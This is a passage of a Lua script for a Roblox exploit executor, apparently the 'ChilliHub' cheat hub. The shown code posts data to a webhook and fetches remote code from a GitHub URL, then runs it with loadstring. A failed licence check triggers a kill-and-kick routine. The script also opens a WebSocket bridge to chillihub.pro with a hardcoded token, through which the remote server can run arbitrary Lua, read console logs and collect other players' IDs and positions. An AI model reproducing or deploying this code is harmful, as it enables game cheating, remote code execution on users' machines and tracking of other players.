							"--" .. boundary .. "\r\n",
							fileDisposition,
							"Content-Type: application/json\r\n\r\n",
							fileData,
							"--" .. boundary .. "--\r\n",
						}),
					})

					if type(response) == "table" and (response.StatusCode == 200 or response.StatusCode == 204 or response.Success == true) then
						webhookSuccess = true
					end
				end)
			end

			if not webhookSuccess then
				pcall(function()
					httpReq({
						Url = webhookUrl,
						Method = "POST",
						Headers = { ["Content-Type"] = "application/json" },
						Body = HttpService:JSONEncode({ content = webhookContent }),
					})
				end)
			end
		end)
	end
end

task.spawn(function()
	task.wait(20)
	local guardKey = "\0chilli_guard"
	local globalEnv = typeof(getgenv) == "function" and getgenv() or _G

	local function getGuardApi()
		local guardApi = globalEnv[guardKey]
		if type(guardApi) == "table" and type(guardApi.Ask) == "function" then
			return guardApi
		end
		return nil
	end

	local guardApi = getGuardApi()

	if not guardApi then
		task.spawn(function()
			local guardPayload = nil

			for i = 1, 4 do
				task.wait()

				local ok, result = pcall(function()
					guardPayload = guardPayload or game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/GD/refs/heads/main/SAEGD")
					local chunk, guardError = loadstring(guardPayload)
					assert(chunk, guardError)
					return chunk()
				end)

				if ok then
					chilliPrint("guard: loader ran on try " .. i)
					return
				end

				if type(result) == "string" and string.find(result, "HttpGet", 1, true) then
					guardPayload = nil
				end

				chilliPrint("guard: loader try " .. i .. " failed: " .. tostring(result))
				task.wait(1 + i)
			end
		end)

		local timeout = os.clock() + 30

		while true do
			task.wait(0.25)
			guardApi = getGuardApi()
			if not (guardApi or os.clock() > timeout) then
				continue
			end
			break
		end
	end

	local passedCheck = false

	if guardApi then
		local authKey
		passedCheck, authKey = pcall(guardApi.Ask, "v202")
		passedCheck = passedCheck and type(authKey) == "string" and #authKey > 0
	end

	globalEnv[guardKey] = nil
	if passedCheck then
		return
	end

	pcall(function()
		local cleanupRoutine = globalEnv.ChilliHubSaeCleanup

		if type(cleanupRoutine) == "function" then
			cleanupRoutine()
		end
	end)

	globalEnv.ChilliHubSaeCleanup = nil

	pcall(function()
		local PlayersService = game:GetService("Players")
		local guisToDestroy = { game:GetService("CoreGui") }

		if typeof(gethui) == "function" then
			local ok, result = pcall(gethui)

			if ok and typeof(result) == "Instance" then
				table.insert(guisToDestroy, result)
			end
		end

		local playerGui = PlayersService.LocalPlayer:FindFirstChildOfClass("PlayerGui")

		if playerGui then
			table.insert(guisToDestroy, playerGui)
		end

		for _, guiParent in ipairs(guisToDestroy) do
			for _, child in ipairs(guiParent:GetChildren()) do
				if child:IsA("ScreenGui") then
					pcall(function()
						child:Destroy()
					end)
				end
			end
		end
	end)

	pcall(function()
		rawset(_G, "__ChilliAutoLoadQueued", nil)

		if type(queue_on_teleport) == "function" then
			queue_on_teleport("")
		elseif type(queueonteleport) == "function" then
			queueonteleport("")
		end
	end)

	pcall(function()
		local character = game:GetService("Players").LocalPlayer.Character

		if character then
			character:BreakJoints()
		end
	end)

	pcall(function()
		game:GetService("Players").LocalPlayer:Kick("\u{200B}")
	end)
end)

local HttpService
HttpService = game:GetService("HttpService")
local Players2
Players2 = game:GetService("Players")
local RunService2 = game:GetService("RunService")
local Workspace
Workspace = game:GetService("Workspace")
local mcpToken
mcpToken = "chp-7E0Yzx4yddoAozc9VNLsqTnA"
local mcpWsUrl
mcpWsUrl = "wss://chillihub.pro/roblox-mcp?token=" .. mcpToken
local mcpHeartbeatUrl
mcpHeartbeatUrl = "https://chillihub.pro/roblox-mcp/beat"
local mcpVersion
mcpVersion = "SAE v648"
local maxDepth
maxDepth = 7
local maxKeys
maxKeys = 500
local maxPayloadSize
maxPayloadSize = 245760
local isConnected, isConnecting, localPlayer2, sharedEnv, shouldRun, isWsReady, wsConnection, lastHeartbeatId, awaitingHeartbeatResponse, mcpConnections
local pendingRequests, rpcHandlers, messageCount, mcpPrint, mcpWarn
local debugMcp = false
isConnected = false
isConnecting = false
localPlayer2 = Players2.LocalPlayer
sharedEnv = getgenv and getgenv() or _G

if type(sharedEnv.StopChilliLink) == "function" then
	pcall(sharedEnv.StopChilliLink)
end

shouldRun = true
isWsReady = false
wsConnection = nil
lastHeartbeatId = 0
awaitingHeartbeatResponse = false
mcpConnections = {}
pendingRequests = {}
rpcHandlers = {}
messageCount = 0

mcpPrint = function(...)
	if debugMcp then
		print("[ROBLOX MCP]", ...)
	end
end

mcpWarn = function(...)
	if debugMcp then
		warn("[ROBLOX MCP]", ...)
	end
end

local trimString

trimString = function(str)
	return tostring(str or ""):match("^%s*(.-)%s*$")
end

local clampValue

clampValue = function(value, minVal, maxVal, defaultVal)
	local num = tonumber(value)
	if not num then
		return defaultVal
	end
	return math.max(minVal, math.min(maxVal, num))
end

local cleanupMcpConnections

cleanupMcpConnections = function(connections)
	for _, conn in ipairs(connections) do
		pcall(function()
			conn:Disconnect()
		end)
	end

	table.clear(connections)
end

local getWebsocketApi

getWebsocketApi = function()
	if syn and syn.websocket and type(syn.websocket.connect) == "function" then
		return syn.websocket.connect, "syn.websocket.connect"
	end

	if WebSocket and type(WebSocket.connect) == "function" then
		return WebSocket.connect, "WebSocket.connect"
	end

	if WebSocket and type(WebSocket.new) == "function" then
		return WebSocket.new, "WebSocket.new"
	end

	if WebSocket and type(WebSocket.New) == "function" then
		return WebSocket.New, "WebSocket.New"
	end

	if websocket and type(websocket.connect) == "function" then
		return websocket.connect, "websocket.connect"
	end

	if syn and syn.WebSocket and type(syn.WebSocket.new) == "function" then
		return syn.WebSocket.new, "syn.WebSocket.new"
	end
	return nil, nil
end

local findAvailableFunction

findAvailableFunction = function(targetTable, ...)
	local argsPack = table.pack(...)

	for i = 1, select("#", ...) do
		local methodName = select(i, table.unpack(argsPack, 1, argsPack.n))

		local ok, result = pcall(function()
			return targetTable[methodName]
		end)

		if ok and result ~= nil then
			return result, methodName
		end
	end

	return nil, nil
end

local safeConnectEvent

safeConnectEvent = function(signal, handler)
	if not signal then
		return nil
	end

	local ok, result = pcall(function()
		return signal:Connect(handler)
	end)

	return ok and result or nil
end

local getSafeFullName

getSafeFullName = function(instance)
	if typeof(instance) ~= "Instance" then
		return nil
	end

	local ok, result = pcall(function()
		return instance:GetFullName()
	end)

	return ok and result or instance.Name
end

local serializeData
serializeData = nil

serializeData = function(value, currentDepth, visitedTables)
	currentDepth = currentDepth or 0
	visitedTables = visitedTables or {}
	if maxDepth < currentDepth then
		return "<max-depth>"
	end
	local kind = typeof(value)
	if value == nil or kind == "string" or kind == "boolean" then
		return value
	end

	if kind == "number" then
		if value ~= value or value == math.huge or value == -math.huge then
			return tostring(value)
		end
		return value
	end

	if kind == "Instance" then
		return { type = "Instance", className = value.ClassName, name = value.Name, path = getSafeFullName(value) }
	end

	if kind == "Vector2" then
		return { type = "Vector2", x = value.X, y = value.Y }
	end

	if kind == "Vector3" then
		return { type = "Vector3", x = value.X, y = value.Y, z = value.Z }
	end

	if kind == "Color3" then
		return {
			type = "Color3",
			r = math.floor(value.R * 255 + 0.5),
			g = math.floor(value.G * 255 + 0.5),
			b = math.floor(value.B * 255 + 0.5),
		}
	end

	if kind == "UDim" then
		return { type = "UDim", scale = value.Scale, offset = value.Offset }
	end

	if kind == "UDim2" then
		return {
			type = "UDim2",
			xScale = value.X.Scale,
			xOffset = value.X.Offset,
			yScale = value.Y.Scale,
			yOffset = value.Y.Offset,
		}
	end

	if kind == "CFrame" then
		return { type = "CFrame", components = { value:GetComponents() } }
	end

	if kind == "EnumItem" then
		return tostring(value)
	end

	if kind == "BrickColor" then
		return { type = "BrickColor", name = value.Name, number = value.Number }
	end

	if kind == "table" then
		if visitedTables[value] then
			return "<cycle>"
		end
		visitedTables[value] = true
		local keyCount = 0
		local isArray = true
		local maxIndex = 0

		for k in pairs(value) do
			keyCount += 1

			if not (maxKeys < keyCount) then
				if type(k) ~= "number" or k < 1 or k % 1 ~= 0 then
					isArray = false
				elseif maxIndex < k then
					maxIndex = k
				end

				continue
			end

			break
		end

		local serializedTable

		if isArray and maxIndex <= maxKeys then
			serializedTable = {}

			for i = 1, maxIndex do
				serializedTable[i] = serializeData(value[i], currentDepth + 1, visitedTables)
			end
		else
			serializedTable = {}
			local tableKeyCount = 0

			for k, v in pairs(value) do
				tableKeyCount += 1

				if tableKeyCount > maxKeys then
					serializedTable.__truncated = true
					break
				else
					serializedTable[tostring(k)] = serializeData(v, currentDepth + 1, visitedTables)
				end
			end
		end

		visitedTables[value] = nil
		return serializedTable
	end

	return tostring(value)
end

local sendWsMessage

sendWsMessage = function(payload)
	if not isWsReady or not wsConnection then
		return false, "not connected"
	end

	local ok, result = pcall(function()
		return HttpService:JSONEncode(serializeData(payload))
	end)

	if not ok then
		return false, "JSON encode failed: " .. tostring(result)
	end

	if maxPayloadSize < #result then
		if not (type(payload) == "table" and payload.type == "rpc_result") then
			return false, "message too large"
		end

		result = HttpService:JSONEncode({
			type = "rpc_result",
			requestId = payload.requestId,
			success = false,
			error = string.format("Result is too large to send (%d KB). Return less data.", math.floor(#result / 1024)),
		})
	end

	local ok2, result2 = pcall(function()
		wsConnection:Send(result)
	end)

	if not ok2 then
		return false, "WebSocket send failed: " .. tostring(result2)
	end
	return true
end

local sendRpcEvent

sendRpcEvent = function(eventName, eventData)
	sendWsMessage({ type = "rpc_event", event = eventName, data = eventData or {} })
end

local resolveInstancePath

do
	local rootServices = {
		Game = game,
		game = game,
		Workspace = Workspace,
		workspace = Workspace,
		Players = Players2,
		Lighting = game:GetService("Lighting"),
		ReplicatedStorage = game:GetService("ReplicatedStorage"),
		ReplicatedFirst = game:GetService("ReplicatedFirst"),
		StarterGui = game:GetService("StarterGui"),
		StarterPlayer = game:GetService("StarterPlayer"),
		SoundService = game:GetService("SoundService"),
		Teams = game:GetService("Teams"),
		LocalPlayer = localPlayer2,
	}

	local function splitPath(pathString)
		local pathParts = {}

		for match in trimString(pathString):gmatch("[^%.]+") do
			table.insert(pathParts, match)
		end

		return pathParts
	end

	resolveInstancePath = function(pathString)
		local segments = splitPath(pathString)
		if #segments == 0 then
			return nil, "path is empty"
		end
		local resolvedInstance = rootServices[segments[1]]

		if not resolvedInstance then
			local ok

			ok, resolvedInstance = pcall(function()
				return game:GetService(segments[1])
			end)

			if not (ok and resolvedInstance) then
				return nil, "unknown root: " .. segments[1]
			end
		end

		for i = 2, #segments do
			local segmentName = segments[i]

			if resolvedInstance == Players2 and segmentName == "LocalPlayer" then
				resolvedInstance = localPlayer2
			elseif resolvedInstance == localPlayer2 and segmentName == "PlayerGui" then
				resolvedInstance = localPlayer2:FindFirstChildOfClass("PlayerGui")
			elseif resolvedInstance == localPlayer2 and segmentName == "Character" then
				resolvedInstance = localPlayer2.Character
			elseif resolvedInstance == Workspace and segmentName == "CurrentCamera" then
				resolvedInstance = Workspace.CurrentCamera
			elseif typeof(resolvedInstance) == "Instance" then
				resolvedInstance = resolvedInstance:FindFirstChild(segmentName)
			else
				resolvedInstance = nil
			end

			if not resolvedInstance then
				return nil, "path not found at: " .. segmentName
			end
		end

		return resolvedInstance
	end
end

local defaultInspectProperties, getSafeProperty

local allowedInspectProperties = {
	Archivable = true,
	Anchored = true,
	AssemblyAngularVelocity = true,
	AssemblyLinearVelocity = true,
	AutomaticSize = true,
	BackgroundColor3 = true,
	BackgroundTransparency = true,
	BrickColor = true,
	CanCollide = true,
	CanQuery = true,
	CanTouch = true,
	CanvasPosition = true,
	CanvasSize = true,
	CFrame = true,
	ClipsDescendants = true,
	Color = true,
	Enabled = true,
	FieldOfView = true,
	Health = true,
	Image = true,
	ImageColor3 = true,
	ImageTransparency = true,
	JumpPower = true,
	LayoutOrder = true,
	Material = true,
	MaxHealth = true,
	MoveDirection = true,
	Orientation = true,
	Position = true,
	RichText = true,
	Rotation = true,
	Size = true,
	Text = true,
	TextColor3 = true,
	TextSize = true,
	TextTransparency = true,
	TextWrapped = true,
	Transparency = true,
	Value = true,
	Velocity = true,
	Visible = true,
	WalkSpeed = true,
}

defaultInspectProperties = {
	"Archivable",
	"Position",
	"Size",
	"CFrame",
	"Color",
	"Transparency",
	"Visible",
	"Enabled",
	"Text",
	"Value",
	"Health",
	"MaxHealth",
}

getSafeProperty = function(instance, propertyName)
	if not allowedInspectProperties[propertyName] then
		return nil, "not_allowed"
	end

	local ok, result = pcall(function()
		return instance[propertyName]
	end)

	if ok then
		return serializeData(result)
	end
	return nil, "unavailable"
end

local function getInstanceInfo(instance)
	return {
		name = instance.Name,
		className = instance.ClassName,
		path = getSafeFullName(instance),
		parentPath = instance.Parent and getSafeFullName(instance.Parent) or nil,
	}
end

local function searchInstancesBreadthFirst(rootInstance, maxScanCount, predicateFn)
	local children = rootInstance:GetChildren()
	local scanIndex = 1
	local scannedCount = 0

	while scanIndex <= #children and scannedCount < maxScanCount do
		local currentInstance = children[scanIndex]
		scanIndex += 1
		scannedCount += 1
		if predicateFn(currentInstance, scannedCount) then
			return scannedCount, true
		end

		if #children < maxScanCount then
			local subChildren = currentInstance:GetChildren()

			for _, child in ipairs(subChildren) do
				if not (maxScanCount <= #children) then
					table.insert(children, child)
					continue
				end
				break
			end
		end
	end

	return scannedCount, false
end

local parseColor3, applyUiProperties

do
	local name = "CodexMCP"

	local allowedUiClasses = {
		Frame = true,
		TextLabel = true,
		TextButton = true,
		TextBox = true,
		ImageLabel = true,
		ImageButton = true,
		ScrollingFrame = true,
		UICorner = true,
		UIStroke = true,
		UIListLayout = true,
		UIGridLayout = true,
		UIPadding = true,
		UIAspectRatioConstraint = true,
		UISizeConstraint = true,
	}

	local allowedUiProperties = {
		Active = true,
		AnchorPoint = true,
		AutomaticCanvasSize = true,
		AutomaticSize = true,
		BackgroundColor3 = true,
		BackgroundTransparency = true,
		BorderSizePixel = true,
		CanvasPosition = true,
		CanvasSize = true,
		ClipsDescendants = true,
		CornerRadius = true,
		DisplayOrder = true,
		Enabled = true,
		FillDirection = true,
		Font = true,
		HorizontalAlignment = true,
		Image = true,
		ImageColor3 = true,
		ImageTransparency = true,
		LayoutOrder = true,
		LineJoinMode = true,
		MaxTextSize = true,
		MinTextSize = true,
		Name = true,
		Padding = true,
		PaddingBottom = true,
		PaddingLeft = true,
		PaddingRight = true,
		PaddingTop = true,
		Position = true,
		RichText = true,
		Rotation = true,
		ScrollBarThickness = true,
		Size = true,
		SortOrder = true,
		Text = true,
		TextColor3 = true,
		TextScaled = true,
		TextSize = true,
		TextStrokeColor3 = true,
		TextStrokeTransparency = true,
		TextTransparency = true,
		TextTruncate = true,
		TextWrapped = true,
		TextXAlignment = true,
		TextYAlignment = true,
		Thickness = true,
		Transparency = true,
		VerticalAlignment = true,
		Visible = true,
		ZIndex = true,
	}

	local color3Properties = {
		BackgroundColor3 = true,
		BorderColor3 = true,
		Color = true,
		ImageColor3 = true,
		TextColor3 = true,
		TextStrokeColor3 = true,
	}

	local udim2Properties = { CanvasPosition = false, CanvasSize = true, Position = true, Size = true }
	local vector2Properties = { AnchorPoint = true, CanvasPosition = true }

	local udimProperties = {
		CornerRadius = true,
		Padding = true,
		PaddingBottom = true,
		PaddingLeft = true,
		PaddingRight = true,
		PaddingTop = true,
	}

	local enumProperties = {
		AutomaticCanvasSize = Enum.AutomaticSize,
		AutomaticSize = Enum.AutomaticSize,
		FillDirection = Enum.FillDirection,
		Font = Enum.Font,
		HorizontalAlignment = Enum.HorizontalAlignment,
		LineJoinMode = Enum.LineJoinMode,
		SortOrder = Enum.SortOrder,
		TextTruncate = Enum.TextTruncate,
		TextXAlignment = Enum.TextXAlignment,
		TextYAlignment = Enum.TextYAlignment,
		VerticalAlignment = Enum.VerticalAlignment,
	}

	parseColor3 = function(colorData)
		if type(colorData) ~= "table" then
			return nil
		end
		local rVal = tonumber(colorData[1] or colorData.r)
		local gVal = tonumber(colorData[2] or colorData.g)
		local bVal = tonumber(colorData[3] or colorData.b)
		if not rVal or not gVal or not bVal then
			return nil
		end

		if rVal <= 1 and gVal <= 1 and bVal <= 1 then
			return Color3.new(rVal, gVal, bVal)
		end
		return Color3.fromRGB(
			math.floor(clampValue(rVal, 0, 255, 0)),
			math.floor(clampValue(gVal, 0, 255, 0)),
			math.floor(clampValue(bVal, 0, 255, 0))
		)
	end

	local function parseUDim2(dimData)
		if type(dimData) ~= "table" then
			return nil
		end
		return UDim2.new(
			tonumber(dimData[1] or dimData.xScale) or 0,
			tonumber(dimData[2] or dimData.xOffset) or 0,
			tonumber(dimData[3] or dimData.yScale) or 0,
			tonumber(dimData[4] or dimData.yOffset) or 0
		)
	end

	local function parseVector2(vecData)
		if type(vecData) ~= "table" then
			return nil
		end
		return Vector2.new(
			tonumber(vecData[1] or vecData.x) or 0,
			tonumber(vecData[2] or vecData.y) or 0
		)
	end

	local function parseUDim(dimData)
		if type(dimData) == "number" then
			return UDim.new(0, dimData)
		end

		if type(dimData) ~= "table" then
			return nil
		end
		return UDim.new(
			tonumber(dimData[1] or dimData.scale) or 0,
			tonumber(dimData[2] or dimData.offset) or 0
		)
	end

	local function parseUiProperty(propertyName, propertyValue)
		if color3Properties[propertyName] then
			return parseColor3(propertyValue)
		end

		if udim2Properties[propertyName] then
			return parseUDim2(propertyValue)
		end

		if vector2Properties[propertyName] then
			return parseVector2(propertyValue)
		end

		if udimProperties[propertyName] then
			return parseUDim(propertyValue)
		end

		if enumProperties[propertyName] then
			if typeof(propertyValue) == "EnumItem" then
				return propertyValue
			end
			return enumProperties[propertyName][tostring(propertyValue):match("([^%.]+)$")]
		end

		return propertyValue
	end

	applyUiProperties = function(targetInstance, propsTable)
		if type(propsTable) ~= "table" then
			return { applied = 0, rejected = {} }
		end
		local rejectedProps = {}
		local appliedCount = 0

		for propertyName, rawValue in pairs(propsTable) do
			if not allowedUiProperties[propertyName] then
				table.insert(rejectedProps, { property = tostring(propertyName), reason = "not_allowed" })
			else
				local parsedValue = parseUiProperty(propertyName, rawValue)

				if parsedValue == nil then
					table.insert(rejectedProps, { property = propertyName, reason = "invalid_value" })
				else
					local ok, result = pcall(function()
						targetInstance[propertyName] = parsedValue
					end)

					if ok then
						appliedCount += 1
					else
						table.insert(rejectedProps, { property = propertyName, reason = tostring(result) })
					end
				end
			end
		end

		return { applied = appliedCount, rejected = rejectedProps }
	end

	local function getPlayerGui()
		return localPlayer2:FindFirstChildOfClass("PlayerGui") or localPlayer2:WaitForChild("PlayerGui", 10)
	end

	local function getMcpRootGui(autoCreate)
		local playerGui = getPlayerGui()
		if not playerGui then
			return nil, "PlayerGui is unavailable"
		end
		local codexMCP = playerGui:FindFirstChild("CodexMCP")

		if not codexMCP and autoCreate then
			codexMCP = Instance.new("ScreenGui")
			codexMCP.Name = name
			codexMCP.ResetOnSpawn = false
			codexMCP.IgnoreGuiInset = false
			codexMCP.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
			codexMCP.Parent = playerGui
		end

		return codexMCP
	end

	local function getManagedUi(pathString)
		local rootGui, err = getMcpRootGui(false)
		if not rootGui then
			return nil, err or "managed UI does not exist"
		end
		local trimmedPath = trimString(pathString)
		if trimmedPath == "" or trimmedPath == name then
			return rootGui
		end

		for match in trimmedPath:gmatch("[^%.]+") do
			if match == name then
				continue
			end
			rootGui = rootGui:FindFirstChild(match)
			if not rootGui then
				return nil, "managed UI path not found: " .. match
			end
		end

		return rootGui
	end

	local allowedUiEvents = { Activated = true, MouseButton1Click = true, FocusLost = true }

	local function bindUiEvents(targetInstance, eventList)
		if type(eventList) ~= "table" then
			return
		end

		for _, eventName in ipairs(eventList) do
			if allowedUiEvents[eventName] then
				local ok, eventSignal = pcall(function()
					return targetInstance[eventName]
				end)

				if ok and eventSignal and type(eventSignal.Connect) == "function" then
					local connection = eventSignal:Connect(function(...)
						local eventArgs = { ... }
						sendRpcEvent("ui." .. eventName, {
							path = getSafeFullName(targetInstance),
							name = targetInstance.Name,
							className = targetInstance.ClassName,
							arguments = serializeData(eventArgs)
						})
					end)

					table.insert(rpcHandlers, connection)
				end
			end
		end
	end

	local function buildUiNode(nodeSpec, parentInstance, currentDepth, stateStats)
		if currentDepth > 10 then
			error("UI tree exceeds maximum depth of 10")
		end

		if stateStats.count >= 250 then
			error("UI tree exceeds maximum of 250 objects")
		end

		if type(nodeSpec) ~= "table" then
			error("UI node must be an object")
		end

		local className = trimString(nodeSpec.class or nodeSpec.className)

		if not allowedUiClasses[className] then
			error("UI class is not allowed: " .. className)
		end

		stateStats.count = stateStats.count + 1
		local instance = Instance.new(className)
		instance.Name = trimString(nodeSpec.name) ~= "" and trimString(nodeSpec.name):sub(1, 64) or className .. stateStats.count
		local propResult = applyUiProperties(instance, nodeSpec.props)
		instance.Parent = parentInstance
		bindUiEvents(instance, nodeSpec.events)
		local children = type(nodeSpec.children) == "table" and nodeSpec.children or {}

		for _, child in ipairs(children) do
			buildUiNode(child, instance, currentDepth + 1, stateStats)
		end

		return instance, propResult
	end

	local function buildInstanceTree(targetInstance, currentDepth, maxDepth)
		local info = getInstanceInfo(targetInstance)
		if currentDepth >= maxDepth then
			info.truncated = #targetInstance:GetChildren() > 0
			return info
		end
		info.children = {}

		for _, child in ipairs(targetInstance:GetChildren()) do
			table.insert(info.children, buildInstanceTree(child, currentDepth + 1, maxDepth))
		end

		return info
	end

	local maxOutputLength = 60000
	local maxPendingLines = 80
	local executionStates = {}

	local function stringifyArgs(...)
		local argsPack = table.pack(...)
		local stringifiedArgs = {}

		for i = 1, select("#", ...) do
			local value = select(i, table.unpack(argsPack, 1, argsPack.n))
			stringifiedArgs[i] = tostring(value)
		end

		return table.concat(stringifiedArgs, " ")
	end

	local function compileCode(codeString, chunkLabel)
		local sourceCode = tostring(codeString or "")

		if sourceCode:match("^%s*$") then
			error("Code is empty", 0)
		end

		local chunkName = "=" .. tostring(chunkLabel or "WebConsole"):sub(1, 60)
		local chunk, err = loadstring(sourceCode, chunkName)

		if not chunk then
			local returnChunk = loadstring("return " .. sourceCode, chunkName)
			if returnChunk then
				return returnChunk
			end
			error("Syntax error: " .. tostring(err), 0)
		end

		return chunk
	end

	local function createExecutionEnv(outputHandler)
		local env = getfenv(0)

		local obj = setmetatable({}, {
			__index = env,
			__newindex = function(_, key, val)
				env[key] = val
			end,
		})

		rawset(obj, "print", function(...)
			local argsPack = table.pack(...)
			outputHandler("print", stringifyArgs(...))

			if isConnected then
				print(table.unpack(argsPack, 1, argsPack.n))
			end
		end)

		rawset(obj, "warn", function(...)
			local argsPack = table.pack(...)
			outputHandler("warn", stringifyArgs(...))

			if isConnected then
				warn(table.unpack(argsPack, 1, argsPack.n))
			end
		end)

		return obj
	end

	local function formatReturnInfo(val)
		local kind = typeof(val)
		local ok, result = pcall(tostring, val)

		return {
			type = kind,
			text = (ok and tostring(result) or "<unprintable>"):sub(1, 4000),
			value = kind ~= "nil" and serializeData(val) or nil,
		}
	end

	local function formatExecutionResult(resultsPack, elapsedMs, outputLines, isTruncated)
		local serializedReturns = {}
		local returnDetails = {}

		for i = 2, resultsPack.n do
			serializedReturns[i - 1] = serializeData(resultsPack[i])
			returnDetails[i - 1] = formatReturnInfo(resultsPack[i])
		end

		return {
			output = table.concat(outputLines, "\\n"),
			outputTruncated = isTruncated or nil,
			returns = serializedReturns,
			returnsInfo = returnDetails,
			returnCount = resultsPack.n - 1,
			elapsedMs = elapsedMs,
		}
	end

	local function getTraceback(err)
		return debug.traceback(tostring(err), 2)
	end

	local function flushOutputQueue(taskState)
		if #taskState.pending == 0 then
			return
		end
		local pending = taskState.pending
		taskState.pending = {}
		sendRpcEvent("exec.output", { runId = taskState.id, label = taskState.label, lines = pending })
	end

	local function getPlayerInfo(targetPlayer, includePosition)
		local character = targetPlayer.Character
		local humanoid = character and character:FindFirstChildOfClass("Humanoid")
		local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

		return {
			name = targetPlayer.Name,
			displayName = targetPlayer.DisplayName,
			userId = targetPlayer.UserId,
			accountAge = targetPlayer.AccountAge,
			team = targetPlayer.Team and targetPlayer.Team.Name or nil,
			neutral = targetPlayer.Neutral,
			character = character and character.Name or nil,
			health = humanoid and humanoid.Health or nil,
			maxHealth = humanoid and humanoid.MaxHealth or nil,
			position = includePosition and humanoidRootPart and serializeData(humanoidRootPart.Position) or nil,
		}
	end

		local rpcMethods = {
		["system.ping"] = function(params)
			return { pong = true, echo = params, clientTime = DateTime.now().UnixTimestampMillis }
		end,
		["game.info"] = function()
			return {
				placeId = game.PlaceId,
				gameId = game.GameId,
				jobId = game.JobId,
				placeVersion = game.PlaceVersion,
				privateServerId = game.PrivateServerId,
				privateServerOwnerId = game.PrivateServerOwnerId,
				playerCount = #Players2:GetPlayers(),
				localPlayer = { name = localPlayer2.Name, displayName = localPlayer2.DisplayName, userId = localPlayer2.UserId },
			}
		end,
		execute_lua = function(params)
			local chunk = compileCode(params.code, params.label)
			local outputLines = {}
			local totalOutputLength = 0
			local isTruncated = false

			local executionEnv = createExecutionEnv(function(level, msg)
				if isTruncated then
					return
				end
				local lineText = (level == "warn" and "[warn] " or "") .. msg
				totalOutputLength = totalOutputLength + #lineText + 1

				if maxOutputLength < totalOutputLength then
					isTruncated = true
					table.insert(outputLines, "... output truncated ...")
					return
				end

				table.insert(outputLines, lineText)
			end)

			setfenv(chunk, executionEnv)
			local startTime = os.clock()
			local resultsPack = table.pack(xpcall(chunk, getTraceback))
			local elapsedMs = math.floor((os.clock() - startTime) * 1000 + 0.5)

			if not resultsPack[1] then
				error(string.format("Runtime error: %s\n--- output ---\n%s", tostring(resultsPack[2]), table.concat(outputLines, "\n"):sub(-20000)), 0)
			end

			return formatExecutionResult(resultsPack, elapsedMs, outputLines, isTruncated)
		end,
		["exec.async"] = function(params)
			local chunk = compileCode(params.code, params.label)
			local taskState = { id = HttpService:GenerateGUID(false):sub(1, 8) }
			taskState.label = tostring(params.label or "Script"):sub(1, 60)
			taskState.startedAt = os.clock()
			taskState.pending = {}
			taskState.lineCount = 0
			taskState.dropped = 0

			local executionEnv = createExecutionEnv(function(level, msg)
				taskState.lineCount = taskState.lineCount + 1
				if #taskState.pending >= maxPendingLines then
					taskState.dropped = taskState.dropped + 1
					return
				end
				table.insert(taskState.pending, { kind = level, text = msg:sub(1, 1000) })
			end)

			setfenv(chunk, executionEnv)
			executionStates[taskState.id] = taskState

			task.spawn(function()
				while executionStates[taskState.id] == taskState do
					task.wait(0.3)

					if taskState.dropped > 0 then
						table.insert(taskState.pending, { kind = "warn", text = string.format("... %d line(s) skipped ...", taskState.dropped) })
						taskState.dropped = 0
					end

					flushOutputQueue(taskState)
				end
			end)

			taskState.thread = task.defer(function()
				local resultsPack = table.pack(xpcall(chunk, getTraceback))
				if executionStates[taskState.id] ~= taskState then
					return
				end
				executionStates[taskState.id] = nil
				flushOutputQueue(taskState)
				local startedAt = taskState.startedAt
				local elapsedMs = math.floor((os.clock() - startedAt) * 1000 + 0.5)
				local resultPayload = { runId = taskState.id, label = taskState.label, ok = resultsPack[1] == true, elapsedMs = elapsedMs }

				if resultsPack[1] then
					local formattedResult = formatExecutionResult(resultsPack, elapsedMs, {}, false)
					resultPayload.returnsInfo = formattedResult.returnsInfo
					resultPayload.returnCount = formattedResult.returnCount
				else
					resultPayload.error = tostring(resultsPack[2]):sub(1, 4000)
				end

				sendRpcEvent("exec.finished", resultPayload)
			end)

			return { runId = taskState.id, label = taskState.label }
		end,
		["exec.cancel"] = function(params)
			local taskState = executionStates[tostring(params.runId or "")]
			if not taskState then
				return { cancelled = false, reason = "not running" }
			end
			executionStates[taskState.id] = nil
			pcall(task.cancel, taskState.thread)
			flushOutputQueue(taskState)
			local startedAt = taskState.startedAt

			sendRpcEvent("exec.finished", {
				runId = taskState.id,
				label = taskState.label,
				ok = false,
				error = "Execution cancelled by client",
				elapsedMs = math.floor((os.clock() - startedAt) * 1000 + 0.5),
			})

			return { cancelled = true, runId = taskState.id }
		end,
		["exec.list"] = function()
			local activeRuns = {}

			for _, taskState in pairs(executionStates) do
				table.insert(activeRuns, {
					runId = taskState.id,
					label = taskState.label,
					startedAt = taskState.startedAt,
					elapsedMs = math.floor((os.clock() - taskState.startedAt) * 1000 + 0.5),
					lineCount = taskState.lineCount,
					pendingCount = #taskState.pending,
				})
			end

			return { count = #activeRuns, runs = activeRuns }
		end,
		["console.tail"] = function(params)
			local logHistory = game:GetService("LogService"):GetLogHistory()
			local limitVal = clampValue(params.limit, 1, 500, 200)
			local sinceTimestamp = tonumber(params.since) or 0
			local logEntries = {}

			for i = #logHistory, 1, -1 do
				local entry = logHistory[i]

				if not (entry.timestamp <= sinceTimestamp or #logEntries >= limitVal) then
					table.insert(logEntries, 1, {
						id = entry.id,
						kind = entry.kind,
						message = entry.message,
						timestamp = entry.timestamp,
						timeFormatted = entry.timeFormatted,
					})
					continue
				end
				break
			end

			return { count = #logEntries, entries = logEntries, latest = logHistory[#logHistory] and logHistory[#logHistory].timestamp or 0 }
		end,
		["players.list"] = function(params)
			local includePositions = params and params.includePosition == true
			local playersList = {}

			for _, player in ipairs(Players2:GetPlayers()) do
				table.insert(playersList, getPlayerInfo(player, includePositions))
			end

			table.sort(playersList, function(a, b)
				return a.name < b.name
			end)

			return { count = #playersList, players = playersList }
		end,
		["players.get"] = function(params)
			local query = tostring(params and (params.userId or params.name) or "")
			local queryLower = string.lower(trimString(query))

			for _, player in ipairs(Players2:GetPlayers()) do
				if tostring(player.UserId) == query or string.lower(player.Name) == queryLower or string.lower(player.DisplayName) == queryLower then
					return getPlayerInfo(player, true)
				end
			end

			error("Player not found: " .. query)
		end,
		["characters.list"] = function()
			local characterList = {}

			for _, player in ipairs(Players2:GetPlayers()) do
				local character = player.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")
				local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

				table.insert(characterList, {
					playerName = player.Name,
					displayName = player.DisplayName,
